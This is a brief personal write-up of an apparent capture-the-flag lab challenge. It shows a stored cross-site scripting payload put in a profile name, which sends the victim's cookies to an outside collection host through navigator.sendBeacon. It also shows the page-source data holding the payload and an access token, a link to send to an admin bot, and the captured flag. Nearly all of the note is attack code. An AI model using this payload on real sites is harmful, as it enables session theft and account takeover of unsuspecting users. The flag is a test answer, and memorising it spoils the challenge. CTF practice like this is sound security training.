# My Notes

## exploit

### put this payload in your name
```
<script>navigator.sendBeacon('https://ux3s7632.requestrepo.com',document.cookie)</script>
```

### grab access token
it is in page source
```
<script>window.__XUBY_DATA__ = {"workspace":{"name":"Xuby","plan":"team","members":14},"member":{"name":"\u003cscript\u003enavigator.sendBeacon('https://ux3s7632.requestrepo.com',document.cookie)\u003c/script\u003e","headline":"","bio":"","site":"","id":1,"email":"demo@xuby.test"},"session":{"access_token":"cec38cd0b7d7bd364f2aeaed19024951","token_type":"bearer","expires_in":86400},"api":{"base":"/api","me":"/api/me","profile":"/api/profile"},"build":"2026.08.14"};</script>
```

### send this to admin with access token set on it:
https://55d858954e16.pwnbox-lab.com/api/me.html?access_token=cec38cd0b7d7bd364f2aeaed19024951

### flag
```
flag=pwnbox{629747348771ec14404fea9bdfc9a29b}
```
